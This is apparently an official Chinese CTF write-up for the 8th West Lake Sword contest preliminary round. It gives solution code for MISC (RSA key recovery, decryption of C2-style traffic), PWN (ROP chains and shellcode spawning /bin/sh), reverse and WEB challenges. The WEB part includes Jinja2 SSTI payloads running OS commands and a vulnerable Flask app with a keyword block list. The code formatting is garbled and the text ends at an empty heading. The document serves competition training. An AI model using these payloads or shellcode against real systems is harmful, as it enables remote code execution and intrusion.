# 第八届西湖论剑·中国杭州网络安全技能大赛初赛官方Write Up（下）

> 原文: https://www.ctfiot.com/226338.html
> ID: 226338

2025年1月18日，第八届西湖论剑网络安全技能大赛初赛落下帷幕！来自全国420所高校、758支战队、3960人集结线上初赛！

MISC

MISC

糟糕的磁盘

```img1.img -> gSoNiXLC.imgimg2.img -> uGZ85OzT.imgimg3.img -> m8X4exzG.imgimg4.img -> Fsiq6lKn.imgimg5.img -> suPVGqm6.img ```

MISC

CSCS

``` 30819e300d06092a864886f70d010101050003818c00308188028180525e1781f2f02d132a7818a6d269baddbf39352c8d20290ec2294fbe4d77e6549ef4766d8b0e1620000adfbd7aff99cd72f05623eb0def202265cf631dd895acd5e981da8424c03a295895c8194a31641f2eecd5a8715ca89cdbf9433c5d437538767666c3bdb0f8629555375b574fe408a94ae82f92960085d416374f1654b30203010001   pythonfrom Crypto.PublicKey import RSAimport binascii
# 将你的16进制字符串放在这里 hex_key = "30819e300d06092a864886f70d010101050003818c00308188028180525e1781f2f02d132a7818a6d269baddbf39352c8d20290ec2294fbe4d77e6549ef4766d8b0e1620000adfbd7aff99cd72f05623eb0def202265cf631dd895acd5e981da8424c03a295895c8194a31641f2eecd5a8715ca89cdbf9433c5d437538767666c3bdb0f8629555375b574fe408a94ae82f92960085d416374f1654b30203010001" # 用你的实际十六进制字符串替换
# 将十六进制字符串转换为字节 key_bytes = binascii.unhexlify(hex_key)
# 导入RSA公钥 rsa_key = RSA.import_key(key_bytes)
# 提取模数(n)和指数(e) n = rsa_key.n e = rsa_key.e
# 打印模数和指数 print(f"Modulus (n): {n}") print(f"Exponent (e): {e}")
# 将RSA公钥导出为PEM格式 pem_key = rsa_key.publickey().export_key(format='PEM')
# 打印PEM格式公钥 print(pem_key.decode('utf-8'))   pythonfrom cryptography.hazmat.primitives.asymmetric import rsafrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric.utils import ( encode_dss_signature, decode_dss_signature, )from cryptography.hazmat.backends import default_backendimport gmpy2
from sympy import nextprime, isprimeimport random

def generate_rsa_keys_from_components(p, q, n, e, d):""" 使用提供的 n, e, d 生成 RSA 密钥对 :
param n: 模数 (int) :
param e: 公钥指数 (int) :
param d: 私钥指数 (int) :
return: 公钥和私钥对象 """# 创建 RSA 密钥对象 private_key = rsa.RSAPrivateNumbers( p=p, q=q, d=d, dmp1=d % (p - 1), dmq1=d % (q - 1), iqmp=rsa.rsa_crt_iqmp(p, q), public_numbers=rsa.RSAPublicNumbers(e=e, n=n), ).private_key(backend=default_backend())
# 获取公钥 public_key = private_key.public_key()
return public_key, private_key

def save_keys_to_pem(public_key, private_key, public_path, private_path):""" 将公钥和私钥保存为 PEM 格式的文件 :
param public_key: 公钥对象 :
param private_key: 私钥对象 :
param public_path: 公钥文件路径 :
param private_path: 私钥文件路径 """# 序列化公钥为 PEM 格式 public_pem = public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo, )
# 序列化私钥为 PEM 格式 private_pem = private_key.private_bytes( encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption(), )
# 保存公钥到文件with open(public_path, "wb") as f: f.write(public_pem)
# 保存私钥到文件with open(private_path, "wb") as f: f.write(private_pem)

def main(): p = 7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026221 q = 7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026527 e = 0x10001 n = p * q phi = (p - 1) * (q - 1) d = gmpy2.invert(e, phi) print(d) d = int(d)
# 生成密钥对 public_key, private_key = generate_rsa_keys_from_components(p, q, n, e, d)
# 保存密钥到文件 save_keys_to_pem(public_key, private_key, "publicKey.pem", "privateKey.pem") print("公钥和私钥已成功生成并保存到文件中！")if __name__ == "__main__": main()   pythonimport hashlibfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5import base64import hexdump PRIVATE_KEY = """-----BEGIN PRIVATE KEY----- MIICdAIBADANBgkqhkiG9w0BAQEFAASCAl4wggJaAgEAAoGAUl4XgfLwLRMqeBim 0mm63b85NSyNICkOwilPvk135lSe9HZtiw4WIAAK3716/5nNcvBWI+sN7yAiZc9j HdiVrNXpgdqEJMA6KViVyBlKMWQfLuzVqHFcqJzb+UM8XUN1OHZ2ZsO9sPhilVU3 W1dP5AipSugvkpYAhdQWN08WVLMCAwEAAQKBgClZWuu9jZzTNkq79WND+K9BQ/LR vrcaZXJLUuDx+vMCIBoRKcTY+XpvCwZvFMQj7eN5i4TUh1Y4B4yco+FjzR85KDCz q9KuLsJzGcxQQSfcAzDhhLAEhoEaR0ud/F+ltL+RRRv/Pv8DVJG02rWfiFliKecb Y2lS6I7VarAeo4ahAkEAkTXj5VW3w40YhnWoh/hyoCcCa2ic+HIM11hlALQiXE3P KLGj+WeVNzzRveNhQDjDwYZBBl5rvSinhFJ8glXjbQJBAJE14+VVt8ONGIZ1qIf4 cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RSfIJV 5J8CQHq8lC4p77NoNUyhcpvLEgfwMQlcWSFeNSBn5KddmpVuZyU8UR7jwKn5zEa2 RGMmF8AhnCCn+mTeUgl0Ny1rL1kCQCGUN64Jw2PqFdjKDn3a2w7j1nBmEZ52KTgH Ddw6y5NSvuvnIEcFSAEtBEeH9C44sjPnStQhM4LbitlThc1R9XsCQCKkR++Zd/hF okuUihZl79eQ1ekZyxgh5p51S/b3Gpo0BsDseESze3C7r4bRA/Vi4A82nbwU2h7n Zd8mFVZPDUM= -----END PRIVATE KEY-----"""
 encode_data = "SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k="
 private_key = RSA.import_key(PRIVATE_KEY.encode())
 cipher = PKCS1_v1_5.new(private_key) ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)
if ciphertext[0:4] == b'x00x00xBExEF': raw_aes_keys = ciphertext[8:24]# print(raw_aes_keys) raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest() aes_key = raw_aes_hash256[0:16] hmac_key = raw_aes_hash256[16:]
 print("RAW key: {}".format(raw_aes_keys.hex())) print("AES key: {}".format(aes_key.hex())) print("HMAC key: {}".format(hmac_key.hex()))
 hexdump.hexdump(ciphertext)   pythonimport hmacimport binasciiimport base64import hexdumpfrom Crypto.Cipher import AES
 AES_KEY = binascii.unhexlify("9fe14473479a283821241e2af78017e8") HMAC_KEY = binascii.unhexlify("1e3d54f1b9f0e106773a59b7c379a89d") encrypt_data = "00000040efeda3e57f7d7fd589d11640ea0f9a4fe6bc91332723ffc5f43f78b37c21cc7485c44d6c8eb6af74fc7044046059c76519e493e351c9f631d6785d5c07eae9e3"
def decrypt(encrypted_data, iv_bytes, signature, AES_KEY, hmac_key):# if hmac.new(hmac_key, encrypted_data, digestmod="sha256").digest()[:16] != signature:# print("message authentication failed")
# return
 cipher = AES.new(AES_KEY, AES.MODE_CBC, iv_bytes)return cipher.decrypt(encrypted_data)
 encrypt_data = bytes.fromhex(encrypt_data)

try: encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder='big', signed=False) encrypt_data_l = encrypt_data[4:] data1 = encrypt_data_l[:
encrypt_data_length-16] signature = encrypt_data_l[encrypt_data_length-16:
encrypt_data_length] iv_bytes = b"abcdefghijklmnop" dec = decrypt(data1, iv_bytes, signature, AES_KEY, HMAC_KEY)
except: dec = decrypt(encrypt_data, iv_bytes, signature, AES_KEY, HMAC_KEY)
 print("counter: {}".format(int.from_bytes(dec[:4], byteorder='big', signed=False))) print("任务返回长度: {}".format(int.from_bytes(dec[4:8], byteorder='big', signed=False))) print("任务输出类型: {}".format(int.from_bytes(dec[8:12], byteorder='big', signed=False))) print(dec[12:
int.from_bytes(dec[4:8], byteorder='big', signed=False)]) print(hexdump.hexdump(dec))   pythonimport hmacimport binasciiimport base64import hexdumpfrom Crypto.Cipher import AES
 AES_KEY = binascii.unhexlify("9fe14473479a283821241e2af78017e8") HMAC_KEY = binascii.unhexlify("1e3d54f1b9f0e106773a59b7c379a89d") encrypt_data = "hex"
def decrypt(encrypted_data, iv_bytes, signature, AES_KEY, hmac_key): cipher = AES.new(AES_KEY, AES.MODE_CBC, iv_bytes)return cipher.decrypt(encrypted_data)
 encrypt_data = bytes.fromhex(encrypt_data)

try: encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder='big', signed=False) encrypt_data_l = encrypt_data[4:] data1 = encrypt_data_l[:
encrypt_data_length-16] signature = encrypt_data_l[encrypt_data_length-16:
encrypt_data_length] iv_bytes = b"abcdefghijklmnop" dec = decrypt(data1, iv_bytes, signature, AES_KEY, HMAC_KEY)
except: dec = decrypt(encrypt_data, iv_bytes, signature, AES_KEY, HMAC_KEY)
 print("counter: {}".format(int.from_bytes(dec[:4], byteorder='big', signed=False))) print("任务返回长度: {}".format(int.from_bytes(dec[4:8], byteorder='big', signed=False))) print("任务输出类型: {}".format(int.from_bytes(dec[8:12], byteorder='big', signed=False)))
# print(dec[:
100].hex())
# print(dec[12:
int.from_bytes(dec[4:8], byteorder='big', signed=False)]) print(hexdump.hexdump(dec[:
1000])) open('secret.pcapng','wb').write(dec[64:-76])   cppextern "C" {int _LongSwap(int l) {unsigned int res = __builtin_bswap32(*(unsigned int *)&l);
return *(int *)&(res); }
const unsigned char mungify_table[] = {0x7A, 0x64, 0x05, 0xF1,0x1B, 0x9B, 0xA0, 0xB5,0xCA, 0xED, 0x61, 0x0D,0x4A, 0xDF, 0x8E, 0xC7};
const unsigned char mungify_table2[] = {0x05, 0x61, 0x7A, 0xED,0x1B, 0xCA, 0x0D, 0x9B,0x4A, 0xF1, 0x64, 0xC7,0xB5, 0x8E, 0xDF, 0xA0};
unsigned char mungify_table3[] = {0x20, 0x07, 0x13, 0x61,0x03, 0x45, 0x17, 0x72,0x0A, 0x2D, 0x48, 0x0C,0x4A, 0x12, 0xA9, 0xB5};
void COM_UnMunge2(unsigned char *data, int len, int seq){int i;
int mungelen;
int c;
int *pc;
unsigned char *p;
int j;
 mungelen = len & ~3; mungelen /= 4;
for (i = 0; i < mungelen; i++) { pc = (int *)&data[i * 4]; c = *pc; c ^= seq;
 p = (unsigned char *)&c;for (j = 0; j < 4; j++) { *p++ ^= (0xa5 | (j << j) | j | mungify_table2[(i + j) & 0x0f]); }
 c = _LongSwap(c); c ^= ~seq; *pc = c; } } } ```
 ``` g++ -shared -o dll.so dll.cpp    pythonfrom scapy.all import *from ctypes import *import struct
 lib=CDLL('./dll.so') COM_UnMunge=lib.COM_UnMunge2
 pcaps = rdpcap("secret.pcapng")
 f=open('res','wb')for mpacket in pcaps.filter(lambda x:
UDP in x and x[UDP].sport==27015):# mpacket.show() udp=mpacket[UDP] data=bytes(udp.payload)[8:] seq=bytes(udp.payload)[:4] ack=bytes(udp.payload)[4:8] c=create_string_buffer(data) COM_UnMunge(c,len(data),seq[0]) print(mpacket.time,mpacket[IP].src,'->',mpacket[IP].dst) decode_bytes=bytes(c)if len(decode_bytes)>10:if struct.unpack('<L', seq)[0] & (1<<30):if len(decode_bytes)>10+struct.unpack('<h', decode_bytes[7:9])[0]+1: print('find extra data block:') print(decode_bytes[10+struct.unpack('<h', decode_bytes[7:9])[0]:]) decode_bytes=decode_bytes[10:10+struct.unpack('<h', decode_bytes[7:9])[0]]# f.write(decode_bytes) print(f'finally decode data:{decode_bytes}nlength:{len(decode_bytes)}') f.close    ```

PWN

PWN

babytrace

```text:
00000000001723F8 CC int 3 ; Trap to Debugger.text:
00000000001723F9 58 pop rax.text:
00000000001723FA 0B 00 or eax, [rax].text:
00000000001723FC E8 8F 61 EB FF call j_strncmp.text:
0000000000172401 85 C0 test eax, eax.text:
0000000000172403 0F 94 C0 setz al.text:
0000000000172406 EB 22 jmp short loc_17242A
.text:
000000000017242A loc_17242A: .text:
000000000017242A 48 83 C4 08 add rsp, 8.text:
000000000017242E C3 retnpython
from pwn import *
#p=process("./trace")p=remote("127.0.0.1",8888)#context.log_level="debug"#gdb.attach(p,"b *$rebase(0xb2b)")#"b *$rebase(0x14c6)"#raw_input()#libc=ELF("/home/ubuntu/glibc-all-in-one-new/libs/2.35-0ubuntu3.5_amd64/libc.so.6")
def show(idx): p.recvuntil(">") p.sendline(str(2)) p.recvuntil("?n") p.sendline(str(idx))
def set(idx,number,data): p.recvuntil(">") p.sendline(str(1)) p.recvuntil(":n") p.send(data) p.recvuntil("?n") p.sendline(str(idx)) p.recvuntil("?n") p.sendline(str(number))

def go(): p.recvuntil(">") p.sendline(str(3))
'''text:
00000000001723F8 CC int 3 ; Trap to Debugger.text:
00000000001723F9 58 pop rax.text:
00000000001723FA 0B 00 or eax, [rax].text:
00000000001723FC E8 8F 61 EB FF call j_strncmp.text:
0000000000172401 85 C0 test eax, eax.text:
0000000000172403 0F 94 C0 setz al.text:
0000000000172406 EB 22 jmp short loc_17242A
.text:
000000000017242A loc_17242A: .text:
000000000017242A 48 83 C4 08 add rsp, 8.text:
000000000017242E C3 retn
'''
puts_off=0x219098
show(-4)
p.recvuntil(" = ")stack=int(p.recvuntil("n",drop=True),10)-32print(hex(stack))
show(-2)p.recvuntil(" = ")
lib=int(p.recvuntil("n",drop=True),10)-0x21a6a0print(hex(lib))
gadget=lib+0x000001144e6 #0x00000000001144e6 : add rsp, 0x78 ; retint3=lib+0x1723F8rdi=lib+0x000000000002a3e5rsi=lib+0x000000000002be51rdx=lib+0x00000000000796a2rax=lib+0x0000000000045eb0op=lib+0x1142f0read=lib+0x1145e0write=lib+0x114680write_able=lib+2207552
rop_chain=p64(rdi)+p64(0)+p64(rsi)+p64(write_able)+p64(rdx)+p64(8)+p64(read)rop_chain+=p64(rdi)+p64(write_able)+p64(rsi)+p64(write_able)+p64(rdx)+p64(3)+p64(int3)+p64(stack+0x200)+p64(0xdeadbeef)rop_chain+=p64(rdi)+p64(write_able)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(op)rop_chain+=p64(rdi)+p64(3)+p64(rsi)+p64(write_able+0x8)+p64(rdx)+p64(0x40)+p64(read)rop_chain+=p64(rdi)+p64(1)+p64(rsi)+p64(write_able+0x8)+p64(rdx)+p64(0x40)+p64(write)
idx=-((stack-(lib+puts_off))/8)set(idx,gadget,"a"*0x10+rop_chain)
raw_input()p.send("/flagx00")
p.interactive()
```

PWN

Heaven’s door

```python3import pwnlibimport os
from pwn import *
p = process("./task")elf = ELF("./task")#p = remote("ip",port)p.recvuntil('puchid: ')child_pid = int(p.recvline().strip())success("pid: " + str(child_pid))

context.arch = 'i386'context.bits = 32sc32 = shellcraft.i386.linux.open("/proc/{}/mem".format(child_pid), 1)sc_start = """ push 0x23 mov rax,{} push rax retfq mov rsp,0x10500""".format(hex(0x10000+0xc))

sc32= asm(sc_start,arch="amd64",bits=64) + asm(sc32)
context.arch = "amd64"context.bits = 64

sc_mid = """ push 0x33 push {} retfq""".format(hex(0x10000 +len(sc32)+9))

shellcode1 = shellcraft.amd64.sh()sc2 = b"x90"*50 + asm(shellcode1)
sc64 = shellcraft.amd64.syscall('SYS_lseek', 3, elf.symbols['made_in_heaven'], 0)sc64 += shellcraft.amd64.pushstr(sc2)sc64 += shellcraft.amd64.write(3, 'rsp', len(sc2))

sc_combined = sc32 + asm(sc_mid) + asm(sc64)

#gdb.attach(p)

p.send(sc_combined)
p.interactive()
```

PWN

Vpwn

```for i in range(7): add(100)
show()edit(18, pop_rdi&0xffffffff)edit(19, (pop_rdi>>32)&0xffff)edit(20, bin_sh&0xffffffff)edit(21, (bin_sh>>32)&0xffff)edit(22, (pop_rdi+1)&0xffffffff)edit(23, ((pop_rdi+1)>>32)&0xffff)edit(24, system&0xffffffff)edit(25, (system>>32)&0xffff)from pwn import *import ctypes
p = process("./pwn")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")def menu(idx): p.sendlineafter("Enter your choice: ", str(idx))
def add(data): menu(2) p.sendlineafter("Enter the value to push:", str(data))
def show(): menu(4)
def edit(idx, data): menu(1) p.sendlineafter("Enter the index to edit (0-based): ",str(idx)) p.sendlineafter("Enter the new value: ", str(data))

for i in range(7): add(100)
show()pause()p.recvuntil("StackVector contents: ")data_list = p.recvuntil("n")data_list = data_list.split(b' ')low_data = int(data_list[18])unsigned_number = ctypes.c_uint32(low_data).valueprint(hex(unsigned_number))print(hex(int(data_list[19])))libc_addr_high = int(data_list[19])<<32print(hex(libc_addr_high))libcase = libc_addr_high + unsigned_number -0x29d90print(hex(libcase))system = libcase + libc.sym['system']bin_sh = libcase + next(libc.search(b"/bin/sh"))context.arch = 'amd64'pop_rdi = libcase + next(libc.search(asm("pop rdi;ret")))ret = libcase + next(libc.search(asm("ret")))one = libcase + 0xebd43
# gdb.attach(p, 'b *$rebase(0x1751)')edit(18, pop_rdi&0xffffffff)edit(19, (pop_rdi>>32)&0xffff)edit(20, bin_sh&0xffffffff)edit(21, (bin_sh>>32)&0xffff)edit(22, (pop_rdi+1)&0xffffffff)edit(23, ((pop_rdi+1)>>32)&0xffff)edit(24, system&0xffffffff)edit(25, (system>>32)&0xffff)menu(5)
# show()p.interactive()```

REVERSE

REVERSE

BitDance

```python#-*- coding=utf-8 -*-from pwn import *from sys import argv
s = lambda data :sh.send(data)sa = lambda delim,data :sh.sendafter(delim, data)sl = lambda data :sh.sendline(data)sla = lambda delim,data :sh.sendlineafter(delim, data)r = lambda num=4096 :sh.recv(num)rl = lambda keepends=False :sh.recvline(keepends)ru = lambda delims, drop=True :sh.recvuntil(delims, drop)ra = lambda :sh.recvall()sd = lambda data :sh.shutdown(data)ia = lambda :sh.interactive()uu32 = lambda data :
u32(data.ljust(4,' '))uu64 = lambda data :
u64(data.ljust(8,' '))leak = lambda name,addr :
log.success('{} = {:#x}'.format(name, addr))
def dbg(a=''): gdb.attach(sh, a) pause()
binary = './BitDance'libc_path = './libc.so.6' # '/lib/i386-linux-gnu/libc.so.6' / '/lib/x86_64-linux-gnu/libc.so.6'elf = ELF(binary, checksec=False)
    #context.log_level = 'DEBUG'#context.arch = 'amd64'
def pwn(addr, debug):
global shglobal libc
 libc = elf.libc#libc = ELF(libc_path)

 i = 1while True:if(debug == 1): sh = process(binary)#sh = process(binary,env={"LD_PRELOAD" : libc_path})else: ip = addr.split(':')[0] port = addr.split(':')[1] sh = remote(ip, port)
 ru('Welcome to dance: ') sl('a'*i) data = rl()if data.startswith('Wrong length'): sh.close() i += 1continue print('flag length: ' + str(i))break
if __name__ == "__main__": pwn('localhost:
9999', 0)python#-*- coding=utf-8 -*-from pwn import *from sys import argvimport re
s = lambda data :sh.send(data)sa = lambda delim,data :sh.sendafter(delim, data)sl = lambda data :sh.sendline(data)sla = lambda delim,data :sh.sendlineafter(delim, data)r = lambda num=4096 :sh.recv(num)rl = lambda keepends=False :sh.recvline(keepends)ru = lambda delims, drop=True :sh.recvuntil(delims, drop)ra = lambda :sh.recvall()sd = lambda data :sh.shutdown(data)ia = lambda :sh.interactive()uu32 = lambda data :
u32(data.ljust(4,' '))uu64 = lambda data :
u64(data.ljust(8,' '))leak = lambda name,addr :
log.success('{} = {:#x}'.format(name, addr))
def dbg(a=''): gdb.attach(sh, a) pause()
binary = './BitDance'libc_path = './libc.so.6' # '/lib/i386-linux-gnu/libc.so.6' / '/lib/x86_64-linux-gnu/libc.so.6'elf = ELF(binary, checksec=False)
context.log_level = 'DEBUG'#context.arch = 'amd64'
def pwn(addr, debug):
global shglobal libc
 libc = elf.libc#libc = ELF(libc_path)
if(debug == 1): sh = process(binary)#sh = process(binary,env={"LD_PRELOAD" : libc_path})else: ip = addr.split(':')[0] port = addr.split(':')[1] sh = remote(ip, port)
 pd = 'a' * 96 sla('Welcome to dance: ', pd)
 ru('Start from 0n') rl()
 index_list = [0]
for i in range(96*8-1): data = rl()
# 匹配目标字符串，其中 {} 内匹配 x30 或 x31 pattern = r'x1bx5bx30x6dx1bx5bx30x3bx33x31x6d(x30|x31)x1bx5bx30x6dx1bx5bx30x3bx33x32x6d'
# 使用 re.search 查找第一个匹配结果 match = re.search(pattern, data)
 index_list.append(match.end() - 30) #前面还有一个这样的标志，所以要减30
 print(index_list) print(list(reversed(index_list)))
if __name__ == "__main__": pwn('localhost:
9999', 0)python#include <stdio.h>#include <stdlib.h>#include <string.h>
unsigned int FindBitSrc(unsigned int* box, unsigned int dwBitIdx, unsigned int dwBitNum){for (int i = 0; i < dwBitNum; i++) {if (box[i] == dwBitIdx) {return i; } }
return -1;}
unsigned int BitDecode(unsigned char* cipher, unsigned int* box, unsigned int count){unsigned char srcBit = cipher[0] >> 7;
unsigned int idx = 0;
unsigned int dwBitNum = count;
unsigned int dwBitSrcIdx;
unsigned char destBit;
unsigned int index = 0;
while (count--) { dwBitSrcIdx = box[index];
 destBit = (cipher[dwBitSrcIdx >> 3] >> (7 - (dwBitSrcIdx & 7))) & 1; cipher[dwBitSrcIdx >> 3] ^= (srcBit ^ destBit) << (7 - (dwBitSrcIdx & 7));
 srcBit = destBit; idx = dwBitSrcIdx; index++; }
return 0;}
unsigned int BitDanceDecode(unsigned char* cipher, unsigned int len){unsigned int box[] = {223, 64, 650, 471, 493, 580, 763, 459, 754, 349, 393, 417, 643, 638, 208, 324, 690, 490, 747, 200, 505, 256, 124, 670, 651, 550, 392, 517, 129, 526, 35, 388, 183, 654, 109, 318, 137, 585, 492, 117, 750, 507, 164, 622, 101, 358, 535, 661, 662, 78, 41, 378, 628, 410, 449, 533, 593, 222, 491, 38, 709, 462, 83, 230, 644, 627, 468, 80, 724, 295, 4, 435, 5, 383, 444, 341, 692, 411, 678, 360, 679, 277, 49, 57, 688, 649, 463, 337, 167, 123, 142, 55, 558, 397, 472, 700, 683, 115, 376, 728, 268, 245, 689, 332, 361, 731, 20, 429, 619, 286, 287, 641, 107, 63, 209, 46, 477, 74, 635, 21, 529, 257, 356, 723, 17, 516, 671, 316, 19, 419, 215, 86, 749, 193, 498, 118, 740, 347, 217, 292, 655, 482, 695, 501, 431, 368, 401, 424, 713, 466, 82, 25, 264, 598, 161, 694, 147, 340, 283, 185, 254, 13, 736, 297, 733, 766, 56, 367, 592, 510, 422, 568, 571, 666, 602, 727, 645, 84, 111, 203, 110, 584, 436, 575, 155, 192, 518, 597, 335, 454, 450, 37, 583, 158, 664, 399, 165, 307, 76, 537, 114, 624, 170, 206, 687, 169, 385, 483, 703, 681, 426, 730, 120, 456, 621, 36, 272, 717, 357, 718, 22, 54, 255, 497, 274, 59, 536, 320, 726, 389, 514, 339, 460, 108, 534, 660, 69, 190, 626, 379, 140, 181, 131, 240, 288, 448, 77, 24, 39, 113, 187, 322, 216, 734, 42, 104, 153, 278, 433, 353, 373, 636, 502, 423, 374, 317, 87, 567, 485, 72, 540, 415, 443, 1, 605, 201, 407, 427, 390, 210, 179, 314, 188, 425, 156, 486, 746, 244, 476, 219, 710, 211, 488, 499, 149, 202, 523, 2, 696, 414, 442, 184, 737, 432, 196, 338, 565, 520, 711, 595, 398, 359, 364, 102, 406, 45, 65, 685, 73, 509, 637, 365, 313, 235, 296, 721, 134, 569, 128, 416, 760, 126, 98, 263, 51, 599, 452, 693, 348, 508, 241, 34, 362, 145, 538, 180, 659, 458, 47, 676, 352, 218, 282, 566, 79, 309, 639, 386, 127, 12, 27, 609, 603, 663, 163, 691, 233, 294, 586, 207, 581, 139, 741, 589, 494, 512, 159, 612, 402, 682, 441, 577, 739, 310, 10, 531, 591, 464, 674, 116, 665, 75, 608, 157, 267, 743, 412, 269, 298, 675, 729, 105, 265, 720, 371, 579, 545, 70, 9, 553, 576, 121, 377, 32, 631, 504, 52, 705, 154, 606, 604, 408, 753, 594, 224, 252, 279, 434, 745, 582, 440, 150, 258, 351, 614, 647, 33, 646, 94, 561, 611, 62, 765, 198, 618, 633, 273, 400, 58, 302, 735, 457, 455, 290, 319, 451, 85, 204, 31, 308, 413, 89, 744, 11, 613, 698, 166, 229, 23, 350, 742, 640, 330, 336, 546, 122, 395, 652, 541, 634, 667, 372, 119, 311, 475, 758, 238, 447, 151, 532, 714, 304, 552, 418, 405, 106, 93, 600, 625, 18, 465, 276, 680, 409, 321, 446, 289, 195, 630, 213, 403, 53, 615, 40, 363, 716, 91, 381, 587, 135, 617, 461, 176, 271, 521, 547, 60, 543, 554, 327, 588, 559, 66, 160, 556, 328, 764, 601, 92, 16, 334, 236, 668, 738, 186, 684, 346, 141, 610, 205, 515, 130, 500, 467, 762, 428, 303, 239, 177, 748, 511, 525, 88, 453, 266, 572, 752, 391, 542, 248, 246, 138, 473, 48, 524, 281, 212, 522, 481, 323, 496, 420, 574, 437, 232, 99, 28, 469, 387, 722, 143, 767, 148, 280, 285, 90, 344, 234, 8, 227, 270, 291, 513, 312, 657, 61, 260, 607, 751, 301, 152, 275, 480, 214, 259, 243, 326, 573, 375, 226, 704, 563, 81, 199, 7, 250, 366, 225, 725, 146, 487, 251, 396, 699, 590, 686, 305, 342, 578, 333, 706, 528, 237, 656, 197, 380, 100, 3, 439, 174, 489, 249, 300, 343, 345, 549, 293, 220, 506, 474, 261, 299, 173, 478, 394, 759, 620, 484, 404, 562, 96, 369, 555, 194, 708, 438, 26, 702, 642, 658, 672, 519, 50, 125, 43, 331, 470, 719, 44, 551, 673, 182, 370, 421, 355, 570, 132, 354, 231, 495, 262, 648, 172, 629, 168, 6, 564, 136, 30, 382, 171, 653, 761, 755, 162, 315, 732, 325, 189, 669, 253, 596, 697, 67, 306, 144, 503, 29, 178, 677, 103, 707, 548, 701, 112, 191, 530, 242, 756, 479, 616, 632, 430, 539, 527, 221, 15, 329, 175, 445, 623, 14, 560, 247, 97, 544, 284, 133, 228, 68, 757, 71, 712, 95, 557, 715, 384, 0};
unsigned int dwBitNum = len * 8; BitDecode(cipher, box, dwBitNum);
return 0;}
int main(){
unsigned char flag[] = {0x0C,0x61,0x48,0x3A,0x01,0x44,0xD2,0x8D,0xCA,0x0B,0xB8,0x02,0xB1,0xC5,0x88,0x64,0x67,0x69,0x26,0x69,0x11,0xC7,0x47,0x1F,0xDC,0xB7,0x0E,0x1A,0x50,0xC3,0x57,0x0D,0x75,0xAF,0x01,0x58,0x14,0xA2,0x0A,0xFF,0xC8,0x8C,0x05,0xD9,0x40,0xF6,0xA3,0x16,0x21,0x5B,0x3D,0xFF,0x59,0xC2,0xFB,0x54,0x83,0x81,0xB4,0x8E,0x6A,0x50,0x1C,0x08,0xA5,0xB8,0xE4,0x4D,0x41,0xA3,0x12,0x00,0xF0,0xC8,0x0A,0x96,0xAA,0x79,0x48,0xF1,0x5B,0x24,0xD0,0x9D,0x75,0xB7,0xA8,0xDA,0x86,0x44,0x37,0x0B,0xB0,0x44,0x24,0x4C,0x00};
unsigned int flag_length = 96; BitDanceDecode(flag, flag_length);printf("%sn", flag);}
```

WEB

WEB

Rank-l

```shell{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") }}{% endif %}{% endfor %}

该payload将执行系统命令，ls`shell{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()") }}{% endif %}{% endfor %}

该payload将执行系统命令，ls /`shell{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() }}{% endif %}{% endfor %}shell
from flask import Flask, request, render_template, render_template_string, redirect, url_for, abortfrom urllib.parse import unquote
app = Flask(__name__)
phone = ''
def is_safe_input(user_input):# unsafe_keywords = ['eval', 'exec', 'os', 'system', 'import', '__import__'] unsafe_keywords = ['flag','?','*','-','less','nl','tac','more','tail','od','grep','awd','sed','64','/','%2f','%2F']if any(keyword in user_input for keyword in unsafe_keywords):# if user_input in unsafe_keywords:
return Truereturn False
@app.route("/")def index():
return render_template("index.html")
@app.route("/login", methods=["POST"])def login():
global phone phone = request.form.get("phone_number")return render_template("login.html")
@app.route("/cpass", methods=["POST"])def check():
global phone password = request.form.get("password")
if is_safe_input(phone):
return redirect(url_for('index'))
if phone != "1686682318" and password != "Happy_news_admin":
return render_template_string('<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <title>login failed</title> </head>  <script>alert("{}The number does not exist or the password is incorrect!") </script> <script>window.location.href = "/";</script>  </html>'.format(phone))else:
return redirect(url_for('index'))
if __name__ == '__main__': app.run(host="0.0.0.0", port=int("5005"), debug=True)The number does not exist or the password is incorrect!")shellunsafe_keywords = ['flag','?','*','-','less','nl','tac','more','tail','od','grep','awd','sed','64','/','%2f','%2F']shell{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cd ..;ls').read()") }}{% endif %}{% endfor %}
该payload将执行系统命令等价于：ls /shell{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cd ..;t''ac fl''agf149').read()") }}{% endif %}{% endfor %}
该payload将执行系统命令等价于：tac /flagf149shell脚本执行命令：python exp.py ip porteg：python exp.py 192.168.18.32 5005```

WEB

Rank-U

